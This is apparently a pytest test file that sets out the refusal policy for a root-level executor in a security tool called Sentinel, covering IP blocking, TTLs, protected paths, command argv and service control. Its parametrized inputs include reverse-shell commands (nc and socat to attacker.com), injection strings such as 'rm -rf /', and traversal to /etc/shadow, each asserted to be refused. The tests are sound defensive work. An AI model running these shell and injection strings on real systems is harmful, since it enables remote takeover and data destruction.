"""Hostile-input tests for the root executor's policy.

The executor is the only Sentinel component running as root. These tests are
the specification for what it must refuse, and they must never be skipped in CI.
"""

from __future__ import annotations

import pytest

import policy
from policy import PolicyRefusal

pytestmark = pytest.mark.security


# ---------------------------------------------------------------------------
# Never-block
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "address",
    [
        "127.0.0.1",
        "127.0.0.53",
        "::1",
        "10.0.0.5",
        "172.16.4.1",
        "192.168.1.1",
        "169.254.1.1",
        "0.0.0.0",
        "255.255.255.255",
    ],
)
def test_never_block_addresses_are_refused(address):
    with pytest.raises(PolicyRefusal):
        policy.check_blockable(address)


def test_never_block_list_contains_no_deployment_specific_addresses():
    """The hard-coded list must stay universal.

    A public address here would be correct on exactly one deployment and wrong
    on every other, and — worse — it would be invisible: an operator reading
    their config would see no reason why that address is unblockable.
    Site-specific entries belong in `response.extra_allowlist`.
    """
    for network in policy.NEVER_BLOCK_NETWORKS:
        # Private covers RFC1918, loopback, link-local, unspecified, reserved
        # and the RFC 5737 documentation ranges. Multicast is the one legitimate
        # non-private entry. Anything else is a real routable address and does
        # not belong in code.
        assert network.is_private or network.is_multicast, (
            f"{network} is a globally routable address hard-coded into the "
            "never-block list. It would be correct on exactly one deployment "
            "and silently wrong on every other. Move it to "
            "response.extra_allowlist."
        )


@pytest.mark.parametrize(
    "network",
    ["0.0.0.0/0", "1.0.0.0/8", "203.0.113.0/16", "203.0.113.0/23", "::/0", "2001:db8::/32"],
)
def test_overly_wide_networks_are_refused(network):
    """A /24 is already 256 addresses; anything wider takes out an organisation."""
    with pytest.raises(PolicyRefusal):
        policy.check_blockable(network)


def test_a_normal_public_address_is_blockable():
    network = policy.check_blockable("203.0.113.44")
    assert str(network) == "203.0.113.44/32"


def test_a_slash_24_is_the_widest_allowed():
    assert policy.check_blockable("203.0.113.0/24").prefixlen == 24


@pytest.mark.parametrize(
    "garbage",
    ["", "not-an-ip", "999.999.999.999", "'; rm -rf /", "$(id)", "203.0.113.1; nft flush ruleset",
     "../../etc/passwd", "\x00", "203.0.113.1\n203.0.113.2"],
)
def test_unparseable_input_is_refused_not_coerced(garbage):
    """Unparseable is refused, never guessed at. Anything reaching here that is
    not an address is a bug or an injection attempt."""
    with pytest.raises(PolicyRefusal):
        policy.check_blockable(garbage)


def test_runtime_allowlist_protects_sentinels_own_channels():
    """Blocking Telegram or Anthropic would be silent: no error, no alert, just
    a system that has quietly stopped telling anyone anything."""
    policy.refresh_runtime_allowlist(["198.51.100.0/24"])
    with pytest.raises(PolicyRefusal):
        policy.check_blockable("198.51.100.7")


# ---------------------------------------------------------------------------
# TTL
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("ttl", [0, 1, 59, -1, 30 * 86400 + 1, "3600", 3.5, True])
def test_invalid_ttls_are_refused(ttl):
    with pytest.raises(PolicyRefusal):
        policy.check_ttl(ttl)


def test_none_ttl_means_permanent():
    assert policy.check_ttl(None) is None


# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "path",
    [
        "/etc/sentinel/secrets.env",
        "/opt/sentinel/libexec/sentinel_executor.py",
        "/root/.ssh/authorized_keys",
        "/etc/ssh/sshd_config",
        "/etc/shadow",
        "/etc/sudoers.d/anything",
        "/boot/vmlinuz",
    ],
)
def test_protected_paths_are_refused(path):
    with pytest.raises(PolicyRefusal):
        policy.check_path(path)


@pytest.mark.parametrize(
    "path",
    [
        "relative/path",
        "",
        "/var/log/../../etc/shadow",
        "/var/log/audit/../../../etc/sentinel/secrets.env",
        "/tmp/x\x00.txt",
    ],
)
def test_traversal_and_relative_paths_are_refused(path):
    """Refused, not normalised. Normalising hides the bug that produced it."""
    with pytest.raises(PolicyRefusal):
        policy.check_path(path)


def test_read_allowlist_refuses_anything_not_listed():
    """An allowlist rather than a blocklist: a blocklist is an
    information-disclosure bug waiting for someone to find the path it missed."""
    assert policy.check_readable_path("/var/log/audit/audit.log")
    for path in ("/etc/hosts", "/home/user/.bashrc", "/var/lib/sentinel/state.db"):
        with pytest.raises(PolicyRefusal):
            policy.check_readable_path(path)


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------
def test_string_command_is_refused():
    with pytest.raises(PolicyRefusal, match="not a string"):
        policy.check_argv("dnf -y update nginx")


@pytest.mark.parametrize(
    "argv",
    [
        ["bash", "-c", "id"],
        ["sh", "-c", "id"],
        ["env", "dnf", "update"],
        ["sudo", "-u", "root", "id"],
        ["python3", "-c", "print(1)"],
        ["nc", "-e", "/bin/sh", "attacker.com", "4444"],
        ["socat", "TCP:attacker.com:4444", "EXEC:/bin/sh"],
    ],
)
def test_interpreters_and_shells_are_refused(argv):
    with pytest.raises(PolicyRefusal):
        policy.check_argv(argv)


@pytest.mark.parametrize(
    "injected",
    ["; id", "&& id", "| id", "$(id)", "`id`", "> /etc/passwd", "\nid", "\x00"],
)
def test_command_injection_attempts_are_refused(injected):
    with pytest.raises(PolicyRefusal):
        policy.check_argv(["dnf", "install", f"nginx{injected}"])


def test_argument_count_and_length_are_bounded():
    with pytest.raises(PolicyRefusal):
        policy.check_argv(["dnf"] + ["x"] * 100)
    with pytest.raises(PolicyRefusal):
        policy.check_argv(["dnf", "x" * 5000])


def test_a_legitimate_command_passes():
    assert policy.check_argv(["dnf", "-y", "update", "nginx"]) == ["dnf", "-y", "update", "nginx"]


def test_command_touching_a_protected_path_is_refused():
    with pytest.raises(PolicyRefusal):
        policy.check_argv(["tar", "-cf", "/tmp/x.tar", "/etc/sentinel"])


# ---------------------------------------------------------------------------
# Service control
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "unit",
    [
        "sshd.service",                  # losing this loses remote access
        "sentinel-executor.service",     # stopping the thing doing the stopping
        "sentinel-watchdog.timer",       # the anti-lockout deadman
        "firewalld.service",
    ],
)
def test_critical_units_cannot_be_controlled(unit):
    with pytest.raises(PolicyRefusal):
        policy.check_unit(unit, "stop")


@pytest.mark.parametrize(
    "unit", ["../../etc/passwd", "nginx; rm -rf /", "nginx", "a" * 200, ""]
)
def test_malformed_unit_names_are_refused(unit):
    with pytest.raises(PolicyRefusal):
        policy.check_unit(unit, "restart")


def test_unknown_service_action_is_refused():
    with pytest.raises(PolicyRefusal):
        policy.check_unit("nginx.service", "mask")


def test_a_normal_unit_restart_is_allowed():
    assert policy.check_unit("nginx.service", "restart") == ("nginx.service", "restart")


# ---------------------------------------------------------------------------
# The invariant that keeps the executor trustworthy
# ---------------------------------------------------------------------------
def test_executor_imports_nothing_from_sentinel():
    """If this ever fails, the privilege split has been quietly undone: a
    compromise of the main codebase would reach the root process."""
    from pathlib import Path

    executor_dir = Path(__file__).resolve().parents[2] / "executor"
    for source in executor_dir.glob("*.py"):
        text = source.read_text(encoding="utf-8")
        assert "import sentinel" not in text, f"{source.name} imports the sentinel package"
        assert "from sentinel" not in text, f"{source.name} imports from the sentinel package"


def test_policy_agrees_with_sentinel_constants():
    """The duplication between policy.py and constants.py is deliberate — see
    executor/README.md. This test is what keeps the two copies honest."""
    from sentinel import constants

    assert policy.MAX_BLOCKS_PER_MINUTE == constants.MAX_BLOCKS_PER_MINUTE
    assert policy.MAX_BLOCKLIST_ELEMENTS == constants.MAX_BLOCKLIST_ELEMENTS
    assert policy.MAX_BLOCK_PREFIX_V4 == constants.MAX_BLOCK_PREFIX_V4
    assert policy.BINARY_ALLOWLIST == constants.PATCH_BINARY_ALLOWLIST
    assert set(policy.PROTECTED_PATHS) <= set(constants.PROTECTED_PATHS)

    policy_nets = {str(n) for n in policy.NEVER_BLOCK_NETWORKS}
    constants_nets = {str(n) for n in constants.NEVER_BLOCK_NETWORKS}
    assert constants_nets <= policy_nets, "constants.py lists a network policy.py does not"
